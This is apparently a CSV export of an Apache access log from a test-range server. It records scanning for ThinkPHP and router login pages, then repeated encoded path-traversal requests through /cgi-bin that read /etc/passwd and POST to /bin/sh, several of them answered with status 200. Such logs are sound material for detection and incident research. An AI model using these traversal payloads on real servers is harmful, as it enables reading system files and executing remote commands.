timestamp_utc,timestamp_raw,server,kind,client_ip,user,method,resource,protocol,status,size,referer,user_agent,level,module,code,pid,message,log,line_no
2021-10-06 19:42:41,06/Oct/2021:19:42:41 +0000,apache2,access,198.18.1.49,,GET,/,HTTP/1.1,200,45,,,,,,,,/var/log/apache2/access_log,1
2021-10-06 19:42:41,06/Oct/2021:19:42:41 +0000,apache2,access,198.18.1.49,,GET,/favicon.ico,HTTP/1.1,404,196,,,,,,,,/var/log/apache2/access_log,2
2021-10-06 19:43:32,06/Oct/2021:19:43:32 +0000,apache2,access,198.18.1.49,,,-,,408,,,,,,,,,/var/log/apache2/access_log,3
2021-10-06 19:47:47,06/Oct/2021:19:47:47 +0000,apache2,access,198.18.2.2,,GET,/solr/,HTTP/1.1,404,196,,,,,,,,/var/log/apache2/access_log,4
2021-10-06 19:59:53,06/Oct/2021:19:59:53 +0000,apache2,access,198.18.7.239,,GET,/TP/public/index.php,HTTP/1.1,404,196,,,,,,,,/var/log/apache2/access_log,5
2021-10-06 19:59:54,06/Oct/2021:19:59:54 +0000,apache2,access,198.18.7.239,,GET,/TP/index.php,HTTP/1.1,404,196,,,,,,,,/var/log/apache2/access_log,6
2021-10-06 19:59:54,06/Oct/2021:19:59:54 +0000,apache2,access,198.18.7.239,,GET,/thinkphp/html/public/index.php,HTTP/1.1,404,196,,,,,,,,/var/log/apache2/access_log,7
2021-10-06 19:59:56,06/Oct/2021:19:59:56 +0000,apache2,access,198.18.7.239,,GET,/html/public/index.php,HTTP/1.1,404,196,,,,,,,,/var/log/apache2/access_log,8
2021-10-06 19:59:56,06/Oct/2021:19:59:56 +0000,apache2,access,198.18.7.239,,GET,/public/index.php,HTTP/1.1,404,196,,,,,,,,/var/log/apache2/access_log,9
2021-10-06 19:59:57,06/Oct/2021:19:59:57 +0000,apache2,access,198.18.7.239,,GET,/TP/html/public/index.php,HTTP/1.1,404,196,,,,,,,,/var/log/apache2/access_log,10
2021-10-06 19:59:57,06/Oct/2021:19:59:57 +0000,apache2,access,198.18.7.239,,GET,/elrekt.php,HTTP/1.1,404,196,,,,,,,,/var/log/apache2/access_log,11
2021-10-06 19:59:58,06/Oct/2021:19:59:58 +0000,apache2,access,198.18.7.239,,GET,/index.php,HTTP/1.1,404,196,,,,,,,,/var/log/apache2/access_log,12
2021-10-06 19:59:58,06/Oct/2021:19:59:58 +0000,apache2,access,198.18.7.239,,GET,/,HTTP/1.1,200,45,,,,,,,,/var/log/apache2/access_log,13
2021-10-06 20:50:15,06/Oct/2021:20:50:15 +0000,apache2,access,198.18.2.230,,GET,/,HTTP/1.1,200,45,,,,,,,,/var/log/apache2/access_log,14
2021-10-06 20:52:40,06/Oct/2021:20:52:40 +0000,apache2,access,198.18.0.0,,GET,/,HTTP/1.1,304,,,,,,,,,/var/log/apache2/access_log,15
2021-10-06 21:00:38,06/Oct/2021:21:00:38 +0000,apache2,access,198.18.0.0,,GET,/,HTTP/1.1,304,,,,,,,,,/var/log/apache2/access_log,16
2021-10-06 21:03:26,06/Oct/2021:21:03:26 +0000,apache2,access,198.18.0.0,,GET,/,HTTP/1.1,304,,,,,,,,,/var/log/apache2/access_log,17
2021-10-06 21:05:56,06/Oct/2021:21:05:56 +0000,apache2,access,198.18.0.0,,GET,/,HTTP/1.1,304,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36",,,,,,/var/log/apache2/access_log,18
2021-10-06 21:06:00,06/Oct/2021:21:06:00 +0000,apache2,access,198.18.0.0,,GET,/,HTTP/1.1,304,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36",,,,,,/var/log/apache2/access_log,19
2021-10-06 21:07:08,06/Oct/2021:21:07:08 +0000,apache2,access,198.18.1.43,,POST,/boaform/admin/formLogin,HTTP/1.1,404,196,http://198.18.11.67:80/admin/login.asp,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0,,,,,,/var/log/apache2/access_log,20
2021-10-06 21:07:22,06/Oct/2021:21:07:22 +0000,apache2,access,198.18.0.0,,GET,/,HTTP/1.1,304,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36",,,,,,/var/log/apache2/access_log,21
2021-10-06 21:08:18,06/Oct/2021:21:08:18 +0000,apache2,access,198.18.0.0,,GET,/,HTTP/1.1,200,45,,curl/7.54.0,,,,,,/var/log/apache2/access_log,22
2021-10-06 21:08:49,06/Oct/2021:21:08:49 +0000,apache2,access,198.18.0.0,,GET,/,HTTP/1.1,200,45,,curl/7.54.0,,,,,,/var/log/apache2/access_log,23
2021-10-06 21:11:01,06/Oct/2021:21:11:01 +0000,apache2,access,198.18.0.0,,GET,/,HTTP/1.1,200,45,,curl/7.54.0,,,,,,/var/log/apache2/access_log,24
2021-10-06 21:11:05,06/Oct/2021:21:11:05 +0000,apache2,access,198.18.0.0,,GET,/,HTTP/1.1,200,45,,curl/7.54.0,,,,,,/var/log/apache2/access_log,25
2021-10-06 21:11:15,06/Oct/2021:21:11:15 +0000,apache2,access,198.18.0.0,,GET,/,HTTP/1.1,200,45,,curl/7.54.0,,,,,,/var/log/apache2/access_log,26
2021-10-06 22:27:28,06/Oct/2021:22:27:28 +0000,apache2,access,198.18.6.110,,POST,/boaform/admin/formLogin,HTTP/1.1,404,196,http://198.18.11.67:80/admin/login.asp,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0,,,,,,/var/log/apache2/access_log,27
2021-10-06 22:52:48,06/Oct/2021:22:52:48 +0000,apache2,access,198.18.1.49,,GET,/,HTTP/1.1,200,45,,curl/7.54.0,,,,,,/var/log/apache2/access_log,28
2021-10-06 22:55:15,06/Oct/2021:22:55:15 +0000,apache2,access,198.18.4.212,,GET,/,HTTP/1.1,200,45,,curl/7.64.0,,,,,,/var/log/apache2/access_log,29
2021-10-06 22:55:26,06/Oct/2021:22:55:26 +0000,apache2,access,198.18.4.212,,GET,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd,HTTP/1.1,403,199,,curl/7.64.0,,,,,,/var/log/apache2/access_log,30
2021-10-06 22:56:01,06/Oct/2021:22:56:01 +0000,apache2,access,198.18.4.212,,GET,/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd,HTTP/1.1,403,199,,curl/7.64.0,,,,,,/var/log/apache2/access_log,31
2021-10-06 22:56:39,06/Oct/2021:22:56:39 +0000,apache2,access,198.18.4.212,,GET,/.%2e/.%2e/.%2e/.%2e//etc/passwd,HTTP/1.1,403,199,,curl/7.64.0,,,,,,/var/log/apache2/access_log,32
2021-10-06 22:56:57,06/Oct/2021:22:56:57 +0000,apache2,access,198.18.4.212,,GET,/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd,HTTP/1.1,403,199,,curl/7.64.0,,,,,,/var/log/apache2/access_log,33
2021-10-06 22:57:05,06/Oct/2021:22:57:05 +0000,apache2,access,198.18.4.212,,GET,/.%2e/.%2e/.%2e//etc/passwd,HTTP/1.1,403,199,,curl/7.64.0,,,,,,/var/log/apache2/access_log,34
2021-10-06 22:57:12,06/Oct/2021:22:57:12 +0000,apache2,access,198.18.4.212,,GET,/.%2e/.%2e//etc/passwd,HTTP/1.1,403,199,,curl/7.64.0,,,,,,/var/log/apache2/access_log,35
2021-10-06 22:57:22,06/Oct/2021:22:57:22 +0000,apache2,access,198.18.4.212,,GET,/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd,HTTP/1.1,403,199,,curl/7.64.0,,,,,,/var/log/apache2/access_log,36
2021-10-06 22:57:59,06/Oct/2021:22:57:59 +0000,apache2,access,198.18.4.212,,GET,/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd,HTTP/1.1,403,199,,curl/7.64.0,,,,,,/var/log/apache2/access_log,37
2021-10-06 23:00:30,06/Oct/2021:23:00:30 +0000,apache2,access,198.18.4.212,,GET,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd,HTTP/1.1,403,199,,curl/7.64.0,,,,,,/var/log/apache2/access_log,38
2021-10-06 23:00:38,06/Oct/2021:23:00:38 +0000,apache2,access,198.18.4.212,,GET,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd,HTTP/1.1,403,199,,curl/7.64.0,,,,,,/var/log/apache2/access_log,39
2021-10-06 23:01:38,06/Oct/2021:23:01:38 +0000,apache2,access,198.18.4.212,,GET,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd,HTTP/1.1,500,528,,curl/7.64.0,,,,,,/var/log/apache2/access_log,40
2021-10-06 23:01:51,06/Oct/2021:23:01:51 +0000,apache2,access,198.18.4.212,,GET,/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd,HTTP/1.1,403,199,,curl/7.64.0,,,,,,/var/log/apache2/access_log,41
2021-10-06 23:02:03,06/Oct/2021:23:02:03 +0000,apache2,access,198.18.4.212,,GET,/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd,HTTP/1.1,403,199,,curl/7.64.0,,,,,,/var/log/apache2/access_log,42
2021-10-06 23:02:14,06/Oct/2021:23:02:14 +0000,apache2,access,198.18.4.212,,GET,/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd,HTTP/1.1,403,199,,curl/7.64.0,,,,,,/var/log/apache2/access_log,43
2021-10-06 23:02:29,06/Oct/2021:23:02:29 +0000,apache2,access,198.18.4.212,,GET,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//bin/sh,HTTP/1.1,500,528,,curl/7.64.0,,,,,,/var/log/apache2/access_log,44
2021-10-06 23:02:49,06/Oct/2021:23:02:49 +0000,apache2,access,198.18.4.212,,GET,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//bin/sh,HTTP/1.1,500,528,,curl/7.64.0,,,,,,/var/log/apache2/access_log,45
2021-10-06 23:03:00,06/Oct/2021:23:03:00 +0000,apache2,access,198.18.4.212,,GET,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//bin/sh,HTTP/1.1,500,528,,curl/7.64.0,,,,,,/var/log/apache2/access_log,46
2021-10-06 23:03:09,06/Oct/2021:23:03:09 +0000,apache2,access,198.18.4.212,,GET,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//bin/sh,HTTP/1.1,500,528,,curl/7.64.0,,,,,,/var/log/apache2/access_log,47
2021-10-06 23:03:13,06/Oct/2021:23:03:13 +0000,apache2,access,198.18.4.212,,GET,/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd,HTTP/1.1,403,199,,curl/7.64.0,,,,,,/var/log/apache2/access_log,48
2021-10-06 23:03:22,06/Oct/2021:23:03:22 +0000,apache2,access,198.18.4.212,,GET,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd,HTTP/1.1,500,528,,curl/7.64.0,,,,,,/var/log/apache2/access_log,49
2021-10-06 23:03:33,06/Oct/2021:23:03:33 +0000,apache2,access,198.18.4.212,,GET,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd,HTTP/1.1,500,528,,curl/7.64.0,,,,,,/var/log/apache2/access_log,50
2021-10-06 23:04:43,06/Oct/2021:23:04:43 +0000,apache2,access,198.18.4.212,,GET,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd,HTTP/1.1,200,1567,,curl/7.64.0,,,,,,/var/log/apache2/access_log,51
2021-10-06 23:05:35,06/Oct/2021:23:05:35 +0000,apache2,access,198.18.4.35,,GET,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd,HTTP/1.1,200,1567,,curl/7.64.0,,,,,,/var/log/apache2/access_log,52
2021-10-06 23:06:05,06/Oct/2021:23:06:05 +0000,apache2,access,198.18.4.35,,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//bin/sh,HTTP/1.1,200,121432,,curl/7.64.0,,,,,,/var/log/apache2/access_log,53
2021-10-06 23:06:10,06/Oct/2021:23:06:10 +0000,apache2,access,198.18.4.35,,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//bin/sh,HTTP/1.1,200,121432,,curl/7.64.0,,,,,,/var/log/apache2/access_log,54
2021-10-06 23:08:03,06/Oct/2021:23:08:03 +0000,apache2,access,198.18.4.35,,GET,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd,HTTP/1.1,403,199,,curl/7.64.0,,,,,,/var/log/apache2/access_log,55
2021-10-06 23:08:34,06/Oct/2021:23:08:34 +0000,apache2,access,198.18.4.35,,GET,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd,HTTP/1.1,403,199,,curl/7.64.0,,,,,,/var/log/apache2/access_log,56
2021-10-06 23:09:09,06/Oct/2021:23:09:09 +0000,apache2,access,198.18.4.35,,GET,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd,HTTP/1.1,403,199,,curl/7.64.0,,,,,,/var/log/apache2/access_log,57
2021-10-06 23:09:37,06/Oct/2021:23:09:37 +0000,apache2,access,198.18.4.35,,GET,/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd,HTTP/1.1,403,199,,curl/7.64.0,,,,,,/var/log/apache2/access_log,58
2021-10-06 23:09:42,06/Oct/2021:23:09:42 +0000,apache2,access,198.18.4.35,,GET,/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd,HTTP/1.1,403,199,,curl/7.64.0,,,,,,/var/log/apache2/access_log,59
2021-10-06 23:10:15,06/Oct/2021:23:10:15 +0000,apache2,access,198.18.4.35,,GET,/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd,HTTP/1.1,403,199,,curl/7.64.0,,,,,,/var/log/apache2/access_log,60
2021-10-06 23:11:54,06/Oct/2021:23:11:54 +0000,apache2,access,198.18.4.35,,GET,/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd,HTTP/1.1,403,199,,curl/7.64.0,,,,,,/var/log/apache2/access_log,61
2021-10-06 23:12:35,06/Oct/2021:23:12:35 +0000,apache2,access,198.18.4.35,,GET,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd,HTTP/1.1,200,1567,,curl/7.64.0,,,,,,/var/log/apache2/access_log,62
2021-10-06 23:13:22,06/Oct/2021:23:13:22 +0000,apache2,access,198.18.4.35,,GET,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd,HTTP/1.1,200,1567,,curl/7.64.0,,,,,,/var/log/apache2/access_log,63
2021-10-06 23:25:07,06/Oct/2021:23:25:07 +0000,apache2,access,198.18.6.17,,GET,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd,HTTP/1.1,500,528,,curl/7.64.0,,,,,,/var/log/apache2/access_log,64
2021-10-06 23:25:34,06/Oct/2021:23:25:34 +0000,apache2,access,198.18.6.17,,GET,/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd,HTTP/1.1,403,199,,curl/7.64.0,,,,,,/var/log/apache2/access_log,65
2021-10-06 23:26:02,06/Oct/2021:23:26:02 +0000,apache2,access,198.18.6.17,,GET,/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd,HTTP/1.1,403,199,,curl/7.64.0,,,,,,/var/log/apache2/access_log,66
2021-10-06 23:26:36,06/Oct/2021:23:26:36 +0000,apache2,access,198.18.6.17,,GET,/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd,HTTP/1.1,403,199,,curl/7.64.0,,,,,,/var/log/apache2/access_log,67
2021-10-06 23:26:41,06/Oct/2021:23:26:41 +0000,apache2,access,198.18.6.17,,GET,/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd,HTTP/1.1,403,199,,curl/7.64.0,,,,,,/var/log/apache2/access_log,68
2021-10-06 23:26:47,06/Oct/2021:23:26:47 +0000,apache2,access,198.18.6.17,,GET,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd,HTTP/1.1,200,1567,,curl/7.64.0,,,,,,/var/log/apache2/access_log,69
2021-10-06 23:27:15,06/Oct/2021:23:27:15 +0000,apache2,access,198.18.6.17,,GET,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd,HTTP/1.1,500,528,,curl/7.64.0,,,,,,/var/log/apache2/access_log,70
2021-10-06 23:27:51,06/Oct/2021:23:27:51 +0000,apache2,access,198.18.6.17,,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//bin/sh,HTTP/1.1,200,45,,curl/7.64.0,,,,,,/var/log/apache2/access_log,71
2021-10-06 23:28:02,06/Oct/2021:23:28:02 +0000,apache2,access,198.18.6.17,,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//bin/sh,HTTP/1.1,200,45,,curl/7.64.0,,,,,,/var/log/apache2/access_log,72
2021-10-06 23:30:30,06/Oct/2021:23:30:30 +0000,apache2,access,198.18.6.17,,GET,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd,HTTP/1.1,500,528,,curl/7.64.0,,,,,,/var/log/apache2/access_log,73
2021-10-06 23:30:34,06/Oct/2021:23:30:34 +0000,apache2,access,198.18.6.17,,GET,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd,HTTP/1.1,500,528,,curl/7.64.0,,,,,,/var/log/apache2/access_log,74
2021-10-06 23:30:45,06/Oct/2021:23:30:45 +0000,apache2,access,198.18.6.17,,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//bin/sh,HTTP/1.1,200,45,,curl/7.64.0,,,,,,/var/log/apache2/access_log,75
2021-10-06 23:31:59,06/Oct/2021:23:31:59 +0000,apache2,access,198.18.6.17,,GET,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd,HTTP/1.1,500,528,,curl/7.64.0,,,,,,/var/log/apache2/access_log,76
2021-10-06 23:32:33,06/Oct/2021:23:32:33 +0000,apache2,access,198.18.6.17,,GET,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd,HTTP/1.1,500,528,,curl/7.64.0,,,,,,/var/log/apache2/access_log,77
2021-10-06 23:32:36,06/Oct/2021:23:32:36 +0000,apache2,access,198.18.6.17,,GET,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd,HTTP/1.1,500,528,,curl/7.64.0,,,,,,/var/log/apache2/access_log,78
2021-10-06 23:32:42,06/Oct/2021:23:32:42 +0000,apache2,access,198.18.6.17,,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//bin/sh,HTTP/1.1,200,45,,curl/7.64.0,,,,,,/var/log/apache2/access_log,79
2021-10-06 23:33:05,06/Oct/2021:23:33:05 +0000,apache2,access,198.18.6.17,,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd,HTTP/1.1,500,528,,curl/7.64.0,,,,,,/var/log/apache2/access_log,80
2021-10-06 23:33:13,06/Oct/2021:23:33:13 +0000,apache2,access,198.18.6.17,,POST,/c.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e//etc/passwd,HTTP/1.1,403,199,,curl/7.64.0,,,,,,/var/log/apache2/access_log,81
